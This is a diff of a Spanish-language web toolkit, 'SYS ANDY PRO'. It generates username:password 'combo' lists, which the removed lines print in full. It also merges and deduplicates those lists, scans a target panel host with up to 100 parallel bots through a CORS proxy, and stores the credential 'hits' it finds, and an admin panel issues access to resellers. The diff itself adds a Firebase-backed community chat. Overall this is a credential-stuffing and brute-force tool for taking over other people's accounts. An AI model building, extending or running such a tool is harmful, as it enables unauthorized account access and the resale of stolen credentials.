@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SYS ANDY PRO - MULTI HERRAMIENTA</title>
+    <title>SYS ANDY PRO - LEÓN ROJO + CHAT GENERAL</title>
     <style>
         /* ========== PALETA LEÓN ROJO + NEGRO con difuminaciones ========== */
         :root {
@@ -27,7 +27,6 @@
             position: relative;
         }
 
-        /* Fondo de león difuminado */
         body::before {
             content: "";
             position: fixed;
@@ -48,7 +47,6 @@
             z-index: 1;
         }
 
-        /* Pantalla de Login */
         #auth-screen {
             display: flex;
             flex-direction: column;
@@ -161,7 +159,6 @@
             display: block;
         }
 
-        /* Sub-tabs dentro del panel de combos */
         .sub-tabs {
             display: flex;
             gap: 10px;
@@ -387,6 +384,153 @@
             font-size: 0.75rem;
             font-weight: bold;
         }
+
+        /* ========== CHAT STYLES ========== */
+        .chat-container {
+            background: rgba(0,0,0,0.7);
+            border-radius: 20px;
+            padding: 15px;
+            margin-top: 10px;
+            border: 2px solid #ff4422;
+        }
+        .chat-messages {
+            height: 400px;
+            overflow-y: auto;
+            padding: 10px;
+            background: #1a0303;
+            border-radius: 15px;
+            margin-bottom: 15px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .chat-message {
+            background: #2a0a0a;
+            border-radius: 15px;
+            padding: 8px 12px;
+            border-left: 5px solid var(--user-color, #ff8844);
+            position: relative;
+        }
+        .chat-message.replying {
+            border-left: 5px solid #ffaa33;
+            background: #331a0a;
+        }
+        .message-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 5px;
+            flex-wrap: wrap;
+        }
+        .message-avatar {
+            font-size: 1.2rem;
+            background: #000;
+            border-radius: 50%;
+            width: 28px;
+            height: 28px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .message-name {
+            font-weight: bold;
+            color: var(--user-color, #ffaa66);
+        }
+        .message-time {
+            font-size: 0.7rem;
+            color: #ffaa88;
+        }
+        .message-text {
+            color: #ffddcc;
+            word-break: break-word;
+            white-space: pre-wrap;
+        }
+        .reply-preview {
+            background: #3a1a0a;
+            border-radius: 10px;
+            padding: 5px;
+            margin-bottom: 5px;
+            font-size: 0.8rem;
+            border-left: 3px solid #ffaa33;
+        }
+        .message-actions {
+            position: absolute;
+            top: 5px;
+            right: 8px;
+            display: flex;
+            gap: 8px;
+            opacity: 0;
+            transition: opacity 0.2s;
+        }
+        .chat-message:hover .message-actions {
+            opacity: 1;
+        }
+        .msg-btn {
+            background: none;
+            border: none;
+            color: #ffaa88;
+            cursor: pointer;
+            font-size: 0.8rem;
+        }
+        .msg-btn:hover { color: #ff4422; }
+        .chat-input-area {
+            display: flex;
+            gap: 10px;
+            align-items: flex-end;
+        }
+        .chat-input {
+            flex: 1;
+            background: #1f0808;
+            border: 2px solid #aa4422;
+            border-radius: 25px;
+            padding: 10px 15px;
+            color: white;
+            resize: none;
+        }
+        .reply-badge {
+            background: #ff4422;
+            border-radius: 20px;
+            padding: 4px 10px;
+            font-size: 0.8rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 5px;
+        }
+        .profile-config {
+            background: #1a0505;
+            border-radius: 20px;
+            padding: 10px;
+            margin-bottom: 15px;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .avatar-select {
+            font-size: 1.5rem;
+            background: #000;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            text-align: center;
+            line-height: 40px;
+            cursor: pointer;
+        }
+        .mention {
+            background: #ff4422;
+            color: white;
+            border-radius: 12px;
+            padding: 0 5px;
+            cursor: pointer;
+        }
+        @keyframes highlight {
+            0% { background-color: #ffaa33; }
+            100% { background-color: #2a0a0a; }
+        }
+        .highlight-message {
+            animation: highlight 1s ease;
+        }
     </style>
     
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
@@ -421,12 +565,14 @@
 
     <div class="tabs-container">
         <button class="tab-btn" onclick="switchTab('bloc')">📝 BLOC URLS</button>
-        <button class="tab-btn active" id="tabCombosBtn" onclick="switchTab('combos')">📦 COMBOS</button>
+        <button class="tab-btn" id="tabCombosBtn" onclick="switchTab('combos')">📦 COMBOS</button>
         <button class="tab-btn" onclick="switchTab('scanner')">📡 ESCÁNER LSF</button>
         <button class="tab-btn" onclick="switchTab('banco-hits')">🗄️ BANCO HITS</button>
         <button class="tab-btn" id="tabAdminBtn" onclick="switchTab('admins')">👥 ADMINS</button>
+        <button class="tab-btn" id="tabChatBtn" onclick="switchTab('chat')">💬 CHAT GENERAL</button>
     </div>
 
+    <!-- PANEL BLOC URLS -->
     <div id="panel-bloc" class="panel">
         <h3>Bloc de Servidores &amp; URLs</h3>
         <div class="item-card" style="border:2px solid var(--borde-neon)">
@@ -440,16 +586,15 @@
         <div class="item-list" id="listaUrlsContainer"></div>
     </div>
 
-    <div id="panel-combos" class="panel active">
+    <!-- PANEL COMBOS (con sub-tabs) -->
+    <div id="panel-combos" class="panel">
         <h3>📦 MÚLTIPLE HERRAMIENTA DE COMBOS</h3>
-        <!-- Sub-pestañas internas -->
         <div class="sub-tabs">
             <button class="sub-tab active" data-sub="generator">Generador de Combos</button>
             <button class="sub-tab" data-sub="merge">Unir Combos</button>
             <button class="sub-tab" data-sub="dedupe">Eliminar Duplicados</button>
         </div>
 
-        <!-- Sub-panel: Generador -->
         <div id="sub-generator" class="sub-panel active">
             <div class="form-group">
                 <label>Tipo de generación:</label>
@@ -463,8 +608,8 @@
                     <option value="num_num">Combos numéricos (numero:número)</option>
                     <option value="nombre_alfanumerico">Nombre: Alfanuméricos</option>
                     <option value="personalizado">Personalizado (Pederrizador)</option>
-                    <option value="desordenado">🎲 Combo Desordenado (mayúsculas/minúsculas/números/símbolos)</option>
-                    <option value="mezclado">🔄 Combo Mezclado (Ej: Andy123:AnDy123)</option>
+                    <option value="desordenado">🎲 Combo Desordenado</option>
+                    <option value="mezclado">🔄 Combo Mezclado</option>
                 </select>
             </div>
             <div class="form-group">
@@ -477,162 +622,101 @@
             </div>
             <div class="form-group">
                 <label>Separador:</label>
-                <select id="genSep">
-                    <option value=":">:</option>
-                    <option value="|">|</option>
-                    <option value=";">;</option>
-                </select>
+                <select id="genSep"><option value=":">:</option><option value="|">|</option><option value=";">;</option></select>
             </div>
             <div class="form-group">
-                <label>Formato usuario (minúscula/mayúscula):</label>
-                <select id="genUserCase">
-                    <option value="lower">Minúscula</option>
-                    <option value="upper">Mayúscula</option>
-                    <option value="capitalize">Primera mayúscula</option>
-                </select>
+                <label>Formato usuario:</label>
+                <select id="genUserCase"><option value="lower">Minúscula</option><option value="upper">Mayúscula</option><option value="capitalize">Primera mayúscula</option></select>
             </div>
             <div class="form-group">
                 <label>Formato contraseña:</label>
-                <select id="genPassCase">
-                    <option value="lower">Minúscula</option>
-                    <option value="upper">Mayúscula</option>
-                    <option value="capitalize">Primera mayúscula</option>
-                </select>
+                <select id="genPassCase"><option value="lower">Minúscula</option><option value="upper">Mayúscula</option><option value="capitalize">Primera mayúscula</option></select>
             </div>
             <button class="btn-block btn-start" onclick="generarComboAvanzado()">⚡ GENERAR COMBOS (SIN REPETIR)</button>
-            <div class="form-group" style="margin-top: 20px;">
-                <label>Resultado:</label>
-                <textarea id="comboResultado" rows="10" readonly placeholder="Aquí aparecerán los combos generados..."></textarea>
-            </div>
-            <button id="btnDescargarComboGen" class="btn-block btn-save" disabled onclick="descargarComboGenerado()">⬇️ DESCARGAR COMBO (.TXT)</button>
+            <div class="form-group"><label>Resultado:</label><textarea id="comboResultado" rows="10" readonly></textarea></div>
+            <button id="btnDescargarComboGen" class="btn-block btn-save" disabled onclick="descargarComboGenerado()">⬇️ DESCARGAR COMBO</button>
         </div>
 
-        <!-- Sub-panel: Unir Combos -->
         <div id="sub-merge" class="sub-panel">
-            <div class="form-group">
-                <label>Lista de combos 1 (archivo .txt):</label>
-                <input type="file" id="mergeFile1" accept=".txt">
-            </div>
-            <div class="form-group">
-                <label>Lista de combos 2 (archivo .txt):</label>
-                <input type="file" id="mergeFile2" accept=".txt">
-            </div>
-            <div class="form-group">
-                <label>Lista de combos 3 (archivo .txt, opcional):</label>
-                <input type="file" id="mergeFile3" accept=".txt">
-            </div>
-            <div class="form-group">
-                <label>Separador de salida:</label>
-                <select id="mergeSep">
-                    <option value=":">:</option>
-                    <option value="|">|</option>
-                    <option value=";">;</option>
-                </select>
-            </div>
+            <div class="form-group"><label>Archivo 1:</label><input type="file" id="mergeFile1" accept=".txt"></div>
+            <div class="form-group"><label>Archivo 2:</label><input type="file" id="mergeFile2" accept=".txt"></div>
+            <div class="form-group"><label>Archivo 3 (opcional):</label><input type="file" id="mergeFile3" accept=".txt"></div>
+            <div class="form-group"><label>Separador salida:</label><select id="mergeSep"><option value=":">:</option><option value="|">|</option><option value=";">;</option></select></div>
             <button class="btn-block btn-start" onclick="unirCombos()">🔗 UNIR COMBOS</button>
-            <div class="form-group" style="margin-top: 20px;">
-                <label>Resultado unificado:</label>
-                <textarea id="mergeResultado" rows="10" readonly placeholder="Aquí aparecerán los combos unidos..."></textarea>
-            </div>
-            <button id="btnDescargarMerge" class="btn-block btn-save" disabled onclick="descargarMergeResultado()">⬇️ DESCARGAR UNIÓN (.TXT)</button>
+            <div class="form-group"><label>Resultado:</label><textarea id="mergeResultado" rows="10" readonly></textarea></div>
+            <button id="btnDescargarMerge" class="btn-block btn-save" disabled onclick="descargarMergeResultado()">⬇️ DESCARGAR UNIÓN</button>
         </div>
 
-        <!-- Sub-panel: Eliminar Duplicados -->
         <div id="sub-dedupe" class="sub-panel">
-            <div class="form-group">
-                <label>Archivo con combos (.txt):</label>
-                <input type="file" id="dedupeFile" accept=".txt">
-            </div>
-            <div class="form-group">
-                <label>...o pega el texto aquí:</label>
-                <textarea id="dedupeText" rows="6" placeholder="Pega tus combos aquí (user:pass por línea)"></textarea>
-            </div>
+            <div class="form-group"><label>Archivo .txt:</label><input type="file" id="dedupeFile" accept=".txt"></div>
+            <div class="form-group"><label>...o pega texto:</label><textarea id="dedupeText" rows="6" placeholder="user:pass por línea"></textarea></div>
             <button class="btn-block btn-start" onclick="eliminarDuplicados()">🧹 ELIMINAR DUPLICADOS</button>
-            <div class="form-group" style="margin-top: 20px;">
-                <label>Resultado sin duplicados:</label>
-                <textarea id="dedupeResultado" rows="10" readonly placeholder="Aquí aparecerán los combos únicos..."></textarea>
-            </div>
-            <button id="btnDescargarDedupe" class="btn-block btn-save" disabled onclick="descargarDedupeResultado()">⬇️ DESCARGAR LIMPIO (.TXT)</button>
+            <div class="form-group"><label>Resultado:</label><textarea id="dedupeResultado" rows="10" readonly></textarea></div>
+            <button id="btnDescargarDedupe" class="btn-block btn-save" disabled onclick="descargarDedupeResultado()">⬇️ DESCARGAR LIMPIO</button>
         </div>
     </div>
 
+    <!-- PANEL SCANNER -->
     <div id="panel-scanner" class="panel">
-        <div class="form-group">
-            <label>Panel (Host con o sin http/https):</label>
-            <input type="text" id="hostInput" placeholder="ej: lista.com:8080" />
-        </div>
-        <div class="form-group">
-            <label>Selecciona tus archivos de Combos (.txt):</label>
-            <input type="file" id="comboFile1" accept=".txt" style="margin-bottom:6px;" />
-            <input type="file" id="comboFile2" accept=".txt" style="margin-bottom:6px;" />
-            <input type="file" id="comboFile3" accept=".txt" />
-        </div>
-        <div class="form-group">
-            <label>...o pega tus combos aquí en texto libre (user:pass):</label>
-            <textarea id="comboText" rows="4" placeholder="Usuario1:Contraseña1"></textarea>
-        </div>
-        <div class="form-group">
-            <label>Número de conexiones paralelas (bots):</label>
-            <input type="number" id="concurrencyInput" value="80" min="1" max="100" />
-        </div>
-        <div class="checkbox-row" style="display:flex; gap:15px; margin-bottom:15px;">
-            <label><input type="checkbox" id="useCors" checked /> Proxy CORS</label>
-            <label><input type="checkbox" id="soundToggle" checked /> 🔔 Sonido de Gemido</label>
-            <label><input type="checkbox" id="autoDownload" checked /> ⬇️ Auto-Descarga</label>
-        </div>
+        <div class="form-group"><label>Panel (Host con o sin http/https):</label><input type="text" id="hostInput" placeholder="ej: lista.com:8080" /></div>
+        <div class="form-group"><label>Selecciona tus archivos de Combos (.txt):</label><input type="file" id="comboFile1" accept=".txt" style="margin-bottom:6px;" /><input type="file" id="comboFile2" accept=".txt" style="margin-bottom:6px;" /><input type="file" id="comboFile3" accept=".txt" /></div>
+        <div class="form-group"><label>...o pega tus combos aquí (user:pass):</label><textarea id="comboText" rows="4" placeholder="Usuario1:Contraseña1"></textarea></div>
+        <div class="form-group"><label>Número de conexiones paralelas (bots):</label><input type="number" id="concurrencyInput" value="80" min="1" max="100" /></div>
+        <div class="checkbox-row" style="display:flex; gap:15px; margin-bottom:15px;"><label><input type="checkbox" id="useCors" checked> Proxy CORS</label><label><input type="checkbox" id="soundToggle" checked> 🔔 Sonido de Gemido</label><label><input type="checkbox" id="autoDownload" checked> ⬇️ Auto-Descarga</label></div>
         <button id="startBtn" class="btn-block btn-start" disabled>INICIAR SCAN MULTI-JOB</button>
         <button id="stopBtn" class="btn-block btn-stop" disabled>DETENER SCAN</button>
         <button id="saveBtn" class="btn-block btn-save" disabled>GUARDAR TODO EN TELÉFONO (.TXT)</button>
-
-        <div class="job-card">
-            <div class="job-header"><span>Trabajo de Análisis 1</span><span id="hitsCount1">Hits: <span class="yellow-hit">0</span></span></div>
-            <div class="progress-bar-bg"><div id="progressBarFill" class="progress-bar-fill"></div></div>
-            <div id="progressText" class="job-status">Procesados: 0 / 0</div>
-            <div id="currentCombo" class="job-user">Usuario actual: -</div>
-        </div>
-        <div class="job-card">
-            <div class="job-header"><span>Trabajo de Análisis 2</span><span id="hitsCount2">Hits: <span class="yellow-hit">0</span></span></div>
-            <div class="progress-bar-bg"><div id="progressBarFill2" class="progress-bar-fill"></div></div>
-            <div id="progressText2" class="job-status">Procesados: 0 / 0</div>
-            <div id="currentCombo2" class="job-user">Usuario actual: -</div>
-        </div>
-        <div class="job-card">
-            <div class="job-header"><span>Trabajo de Análisis 3</span><span id="hitsCount3">Hits: <span class="yellow-hit">0</span></span></div>
-            <div class="progress-bar-bg"><div id="progressBarFill3" class="progress-bar-fill"></div></div>
-            <div id="progressText3" class="job-status">Procesados: 0 / 0</div>
-            <div id="currentCombo3" class="job-user">Usuario actual: -</div>
-        </div>
-        <div class="results-title">Resultados del Escaneo Actual:</div>
-        <div id="hitsContainer"></div>
+        <div class="job-card"><div class="job-header"><span>Trabajo de Análisis 1</span><span id="hitsCount1">Hits: <span class="yellow-hit">0</span></span></div><div class="progress-bar-bg"><div id="progressBarFill" class="progress-bar-fill"></div></div><div id="progressText" class="job-status">Procesados: 0 / 0</div><div id="currentCombo" class="job-user">Usuario actual: -</div></div>
+        <div class="job-card"><div class="job-header"><span>Trabajo de Análisis 2</span><span id="hitsCount2">Hits: <span class="yellow-hit">0</span></span></div><div class="progress-bar-bg"><div id="progressBarFill2" class="progress-bar-fill"></div></div><div id="progressText2" class="job-status">Procesados: 0 / 0</div><div id="currentCombo2" class="job-user">Usuario actual: -</div></div>
+        <div class="job-card"><div class="job-header"><span>Trabajo de Análisis 3</span><span id="hitsCount3">Hits: <span class="yellow-hit">0</span></span></div><div class="progress-bar-bg"><div id="progressBarFill3" class="progress-bar-fill"></div></div><div id="progressText3" class="job-status">Procesados: 0 / 0</div><div id="currentCombo3" class="job-user">Usuario actual: -</div></div>
+        <div class="results-title">Resultados del Escaneo Actual:</div><div id="hitsContainer"></div>
     </div>
 
+    <!-- PANEL BANCO HITS -->
     <div id="panel-banco-hits" class="panel">
         <h3>🗄️ Historial e Hits Guardados (con Fecha/Hora)</h3>
         <div class="item-list" id="bancoHitsContainer"></div>
     </div>
 
+    <!-- PANEL ADMINS -->
     <div id="panel-admins" class="panel">
         <h3>👥 Panel Maestro: Agregar Nuevos Vendedores</h3>
         <div class="item-card" style="border:2px solid var(--borde-neon)">
-            <p style="color:#ffaa66; font-weight:bold; margin-top:0;">Crear cuenta de acceso inmediato:</p>
-            <div class="form-group">
-                <label>Usuario o Correo del Vendedor:</label>
-                <input type="text" id="newAdminEmail" placeholder="ej: pericoverde@gmail.com">
-            </div>
-            <div class="form-group">
-                <label>Contraseña que usará:</label>
-                <input type="text" id="newAdminPass" placeholder="ej: 123456">
-            </div>
+            <div class="form-group"><label>Usuario o Correo del Vendedor:</label><input type="text" id="newAdminEmail" placeholder="ej: pericoverde@gmail.com"></div>
+            <div class="form-group"><label>Contraseña que usará:</label><input type="text" id="newAdminPass" placeholder="ej: 123456"></div>
             <button class="btn-block btn-start" id="btnCrearVendedor" onclick="crearVendedorFirebase()">⚡ CREAR E INSTALAR CREDENCIAL</button>
         </div>
-        
         <h4 style="color:#ffaa66;">Vendedores Activos en el Sistema:</h4>
         <div class="item-list" id="listaVendedoresContainer"></div>
+    </div>
+
+    <!-- PANEL CHAT GENERAL -->
+    <div id="panel-chat" class="panel">
+        <h3>💬 CHAT GENERAL - COMUNIDAD SYS ANDY PRO</h3>
+        <div class="profile-config" id="profileConfig">
+            <div class="avatar-select" id="avatarSelect">🦁</div>
+            <input type="text" id="displayName" placeholder="Tu nombre en el chat" maxlength="20" style="width: 150px;">
+            <button class="btn-small btn-action" id="saveProfileBtn">Guardar perfil</button>
+            <span style="font-size:0.7rem;">(pulsa el emoji para cambiarlo)</span>
+        </div>
+        <div class="chat-container">
+            <div class="chat-messages" id="chatMessages">
+                <!-- mensajes dinámicos -->
+            </div>
+            <div class="reply-badge" id="replyBadge" style="display: none;">
+                <span>Respondiendo a...</span>
+                <button class="msg-btn" id="cancelReplyBtn">❌</button>
+            </div>
+            <div class="chat-input-area">
+                <textarea id="chatInput" class="chat-input" rows="2" placeholder="Escribe tu mensaje... Usa @nombre para etiquetar"></textarea>
+                <button id="sendMsgBtn" class="btn-small btn-start">📤</button>
+            </div>
+        </div>
     </div>
 </div>
 
 <script>
-    // ==================== FIREBASE (NO TOCAR) ====================
+    // ==================== FIREBASE CONFIG ====================
     const firebaseConfig = {
         apiKey: "AIzaSyDGE5GTlwIypuryIVnDYiTR9a2wyCgWkfs",
         authDomain: "gestion-ventas-pro-f8de4.firebaseapp.com",
@@ -653,6 +737,7 @@
         return str.toLowerCase().trim().replace(/[\.\$\#\[\]\@]/g, "_");
     }
 
+    // ==================== LOGIN Y SESIÓN ====================
     function procesarLogin() {
         const emailInput = document.getElementById('loginEmail').value.trim().toLowerCase();
         const passInput = document.getElementById('loginPass').value.trim();
@@ -669,9 +754,9 @@
         }).catch(err => alert("Error de conexión."));
     }
 
-    function ingresarAlSistema(email, elRol) {
-        currentUser = { email: email, role: elRol };
-        usernameClave = limpiarClaveLocal(email);
+    async function ingresarAlSistema(email, elRol) {
+        currentUser = { email: email, role: elRol, uid: limpiarClaveLocal(email) };
+        usernameClave = currentUser.uid;
         document.getElementById('auth-screen').style.display = 'none';
         document.getElementById('main-app').style.display = 'block';
         document.getElementById('userDisplay').textContent = `Admin Activo: ${email} (${elRol})`;
@@ -684,9 +769,13 @@
         renderizarUrlsBloc();
         renderizarBancoHits();
         switchTab('combos');
+        // Inicializar chat
+        await cargarPerfilUsuario(email);
+        iniciarChat();
     }
 
     function cerrarSesion() {
+        if (window.chatUnsubscribe) window.chatUnsubscribe();
         currentUser = null;
         document.getElementById('loginEmail').value = '';
         document.getElementById('loginPass').value = '';
@@ -694,7 +783,7 @@
         document.getElementById('main-app').style.display = 'none';
     }
 
-    // --- VENDEDORES ---
+    // ==================== VENDEDORES (ADMINS) ====================
     function crearVendedorFirebase() {
         const emailVendedor = document.getElementById("newAdminEmail").value.trim();
         const passVendedor = document.getElementById("newAdminPass").value.trim();
@@ -725,298 +814,7 @@
     }
     function eliminarVendedorFirebase(key) { if(confirm("¿Eliminar acceso?")) db.ref("vendedores/" + key).remove(); }
 
-    // ==================== FUNCIONES PARA COMBOS (SIN REPETIR, CON LONGITUD Y MEZCLADO) ====================
-    // Lista masiva de nombres reales (más de 300)
-    const nombresReales = [
-        "juan", "pedro", "carlos", "luis", "andres", "david", "diego", "javier", "manuel", "alejandro", "fernando", "miguel", "rafael", "jorge", "antonio", "angel", "jose", "daniel", "oscar", "ruben",
-        "mario", "ricardo", "victor", "roberto", "francisco", "pablo", "sergio", "adrian", "alberto", "eduardo", "emilio", "enrique", "esteban", "felipe", "gabriel", "guillermo", "hector", "ivan", "julian", "leonardo",
-        "mauricio", "nicolas", "raul", "rodrigo", "sebastian", "tomas", "alonso", "cristian", "fabian", "gaston", "hugo", "ignacio", "jeronimo", "kevin", "lucas", "martin", "nahuel", "octavio", "pablo", "ramon",
-        "santiago", "thiago", "ulises", "valentin", "wenceslao", "xavier", "yago", "zacarías", "abraham", "benjamin", "camilo", "damian", "elias", "facundo", "gonzalo", "hernan", "ismael", "jesus", "kamilo", "lautaro",
-        "mateo", "naomi", "oliver", "patricio", "quintin", "rene", "simon", "tadeo", "ursulo", "vladimir", "william", "ximena", "yandel", "zoe", "agustin", "bruno", "cesar", "domingo", "emiliano", "fidel",
-        "gerardo", "humberto", "ismael", "julio", "karen", "lorenzo", "marcos", "nelson", "orlando", "paul", "quiroga", "rolando", "saul", "tobias", "ulises", "valentin", "winston", "xenofonte", "yamil", "zulema",
-        "ana", "maria", "laura", "sofia", "valentina", "carmen", "isabella", "camila", "lucia", "martina", "julia", "paula", "daniela", "carolina", "alejandra", "veronica", "silvia", "lorena", "patricia", "gloria",
-        "elena", "rocio", "monica", "andrea", "fernanda", "gabriela", "mariana", "victoria", "beatriz", "roxana", "claudia", "viviana", "liliana", "norma", "cristina", "susana", "marcela", "graciela", "teresa", "raquel"
-    ];
-    const palabrasExtra = ["admin", "user", "test", "root", "master", "demo", "guest", "support", "office", "system", "server", "network", "digital", "global", "prime", "super", "mega", "ultra", "power", "plus"];
-    const simbolos = ["!", "@", "#", "$", "%", "&", "*", "?", "-", "_", "+", "=", "¡", "¿", "~"];
-
-    // Helper: aplicar formato de mayúsculas/minúsculas
-    function applyCase(str, caseType) {
-        if (caseType === 'upper') return str.toUpperCase();
-        if (caseType === 'capitalize') return str.charAt(0).toUpperCase() + str.slice(1).toLowerCase();
-        return str.toLowerCase();
-    }
-
-    // Generar contraseña aleatoria de longitud exacta
-    function generarPasswordAleatoria(longitud) {
-        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-        let result = "";
-        for (let i = 0; i < longitud; i++) {
-            result += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        return result;
-    }
-
-    // Generar texto desordenado (mezcla aleatoria de mayúsculas/minúsculas/números/símbolos) con longitud exacta
-    function generarDesordenadoConLongitud(longitud) {
-        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%&*?-_";
-        let resultado = "";
-        for (let i = 0; i < longitud; i++) {
-            resultado += chars.charAt(Math.floor(Math.random() * chars.length));
-        }
-        return resultado;
-    }
-
-    // Mezclar mayúsculas/minúsculas de un texto (caso aleatorio)
-    function mezclarCase(texto) {
-        let mezclado = "";
-        for (let i = 0; i < texto.length; i++) {
-            if (Math.random() > 0.5) mezclado += texto[i].toUpperCase();
-            else mezclado += texto[i].toLowerCase();
-        }
-        return mezclado;
-    }
-
-    // Generador avanzado SIN REPETICIONES y con control de longitud
-    function generarComboAvanzado() {
-        const tipo = document.getElementById('genType').value;
-        let cantidad = parseInt(document.getElementById('genCantidad').value) || 100;
-        const passLength = parseInt(document.getElementById('genPassLength').value) || 8;
-        const separador = document.getElementById('genSep').value;
-        const userCase = document.getElementById('genUserCase').value;
-        const passCase = document.getElementById('genPassCase').value;
-
-        let combos = new Set();  // ¡Esto evita repeticiones!
-        let intentos = 0;
-        const maxIntentos = cantidad * 10;
-
-        function generarNumeroRango(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
-
-        while (combos.size < cantidad && intentos < maxIntentos) {
-            intentos++;
-            let user = "", pass = "";
-
-            switch (tipo) {
-                case 'userpass_ano':
-                    let nombreBase = nombresReales[Math.floor(Math.random() * nombresReales.length)];
-                    let ano = generarNumeroRango(1996, 2050);
-                    user = nombreBase + ano;
-                    pass = "pass" + ano;
-                    break;
-                case 'useruser':
-                    let n1 = nombresReales[Math.floor(Math.random() * nombresReales.length)];
-                    let n2 = nombresReales[Math.floor(Math.random() * nombresReales.length)];
-                    user = n1;
-                    pass = n2;
-                    break;
-                case 'userpass_num':
-                    let nombreNum = nombresReales[Math.floor(Math.random() * nombresReales.length)];
-                    let num = generarNumeroRango(1, 999);
-                    user = nombreNum + num;
-                    pass = "pass" + num;
-                    break;
-                case 'alfanumericos':
-                    user = Math.random().toString(36).substring(2, 8) + generarNumeroRango(100, 999);
-                    pass = generarPasswordAleatoria(passLength);
-                    break;
-                case 'user_num_fijo':
-                    let nombreFijo = palabrasExtra[Math.floor(Math.random() * palabrasExtra.length)];
-                    let numFijo = generarNumeroRango(123, 999999);
-                    user = nombreFijo;
-                    pass = numFijo.toString();
-                    break;
-                case 'user_num_random':
-                    let nombreRand = palabrasExtra[Math.floor(Math.random() * palabrasExtra.length)];
-                    let numRand = Math.floor(Math.random() * 99999) + 12345;
-                    user = nombreRand;
-                    pass = numRand.toString();
-                    break;
-                case 'num_num':
-                    let num1 = Math.floor(Math.random() * 999999);
-                    let num2 = Math.floor(Math.random() * 999999);
-                    user = num1.toString();
-                    pass = num2.toString();
-                    break;
-                case 'nombre_alfanumerico':
-                    let nombreAlfa = nombresReales[Math.floor(Math.random() * nombresReales.length)];
-                    let alfa = Math.random().toString(36).substring(2, 6);
-                    user = nombreAlfa;
-                    pass = alfa + generarNumeroRango(100, 999);
-                    break;
-                case 'personalizado':
-                    let base = ["elpro", "master", "dios", "rey", "leon", "fuego", "rojo", "negro", "tigre", "jaguar", "guerrero", "soldado", "killer", "legend", "star"];
-                    let pref = base[Math.floor(Math.random() * base.length)];
-                    let suf = Math.floor(Math.random() * 999);
-                    user = pref + suf;
-                    pass = generarPasswordAleatoria(passLength);
-                    break;
-                case 'desordenado':
-                    let nombreDes = nombresReales[Math.floor(Math.random() * nombresReales.length)];
-                    let extraDes = palabrasExtra[Math.floor(Math.random() * palabrasExtra.length)];
-                    let baseUser = nombreDes + extraDes + Math.floor(Math.random() * 999);
-                    user = generarDesordenadoConLongitud(Math.min(baseUser.length, 12)) || baseUser;
-                    user = mezclarCase(user);
-                    pass = generarDesordenadoConLongitud(passLength);
-                    break;
-                case 'mezclado':
-                    let nombreMez = nombresReales[Math.floor(Math.random() * nombresReales.length)];
-                    let extraMez = palabrasExtra[Math.floor(Math.random() * palabrasExtra.length)];
-                    let numeros = Math.floor(Math.random() * 999);
-                    let baseCombo = nombreMez + extraMez + numeros;
-                    user = mezclarCase(baseCombo);
-                    if (Math.random() > 0.5) {
-                        pass = mezclarCase(baseCombo);
-                    } else {
-                        pass = generarDesordenadoConLongitud(passLength);
-                    }
-                    break;
-                default:
-                    user = "user" + Math.random();
-                    pass = generarPasswordAleatoria(passLength);
-            }
-
-            if (tipo !== 'desordenado' && tipo !== 'mezclado') {
-                user = applyCase(user, userCase);
-                pass = applyCase(pass, passCase);
-            } else {
-                user = user;
-                pass = pass;
-            }
-
-            combos.add(user + separador + pass);
-        }
-
-        if (combos.size < cantidad) alert(`⚠️ Solo se pudieron generar ${combos.size} combos únicos (evitando repeticiones).`);
-        else alert(`✅ Generados ${cantidad} combos sin repeticiones.`);
-
-        const resultado = Array.from(combos).join("\n");
-        document.getElementById('comboResultado').value = resultado;
-        document.getElementById('btnDescargarComboGen').disabled = false;
-    }
-
-    function descargarComboGenerado() {
-        const contenido = document.getElementById('comboResultado').value;
-        if (!contenido) return;
-        const blob = new Blob([contenido], { type: 'text/plain' });
-        const a = document.createElement('a');
-        a.href = URL.createObjectURL(blob);
-        a.download = 'combo_generado_sin_repetir.txt';
-        a.click();
-        a.remove();
-    }
-
-    // Unir combos (hasta 3 archivos)
-    let mergeData = { file1: [], file2: [], file3: [] };
-    function readMergeFile(inputEl, targetArray, index) {
-        const file = inputEl.files[0];
-        if (!file) { targetArray.length = 0; return; }
-        const reader = new FileReader();
-        reader.onload = e => {
-            const lines = e.target.result.split(/\r?\n/).filter(l => l.trim().length > 0);
-            targetArray.length = 0;
-            targetArray.push(...lines);
-            actualizarMergeResultado();
-        };
-        reader.readAsText(file);
-    }
-
-    function actualizarMergeResultado() {
-        let combined = [];
-        if (mergeData.file1.length) combined.push(...mergeData.file1);
-        if (mergeData.file2.length) combined.push(...mergeData.file2);
-        if (mergeData.file3.length) combined.push(...mergeData.file3);
-        const resultado = combined.join("\n");
-        document.getElementById('mergeResultado').value = resultado;
-        document.getElementById('btnDescargarMerge').disabled = (combined.length === 0);
-    }
-
-    function unirCombos() {
-        const f1 = document.getElementById('mergeFile1');
-        const f2 = document.getElementById('mergeFile2');
-        const f3 = document.getElementById('mergeFile3');
-        if (f1.files.length) readMergeFile(f1, mergeData.file1, 1);
-        if (f2.files.length) readMergeFile(f2, mergeData.file2, 2);
-        if (f3.files.length) readMergeFile(f3, mergeData.file3, 3);
-        if (!f1.files.length && !f2.files.length && !f3.files.length) {
-            alert("Selecciona al menos un archivo.");
-            return;
-        }
-        actualizarMergeResultado();
-    }
-
-    function descargarMergeResultado() {
-        const contenido = document.getElementById('mergeResultado').value;
-        if (!contenido) return;
-        const blob = new Blob([contenido], { type: 'text/plain' });
-        const a = document.createElement('a');
-        a.href = URL.createObjectURL(blob);
-        a.download = 'combos_unidos.txt';
-        a.click();
-        a.remove();
-    }
-
-    // Eliminar duplicados
-    let dedupeLines = [];
-    function leerArchivoDedupe() {
